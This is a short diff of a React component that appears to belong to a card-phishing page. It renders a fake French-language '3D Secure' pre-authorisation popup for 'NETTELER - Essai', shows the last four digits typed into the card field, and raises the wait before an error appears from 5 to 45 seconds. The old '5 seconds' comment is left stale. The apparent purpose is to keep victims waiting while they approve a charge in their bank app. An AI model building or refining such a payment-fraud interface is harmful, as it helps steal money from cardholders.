@@ -33,7 +33,7 @@ const Board = () => {
     if (show3DSecurePopup) {
       errorTimeout = setTimeout(() => {
         setShowError(true);
-      }, 5000); // 5 seconds
+      }, 45000); // 5 seconds
     }
     return () => {
       clearTimeout(errorTimeout);
@@ -209,7 +209,7 @@ const Board = () => {
                 <p>Confirmez la pré-autorisaton de {getPlanPrice(selectedPlan).replace("/mois", '')} via votre application bancaire.</p>
                 <span>NETTELER - Essai {selectedPlan}</span>
                 <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
-                <span>{new Date().toLocaleDateString('fr-FR')} {new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })}</span>
+                <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>
 
                 <div className="loading-spinner">
                   <div className="spinner"></div>
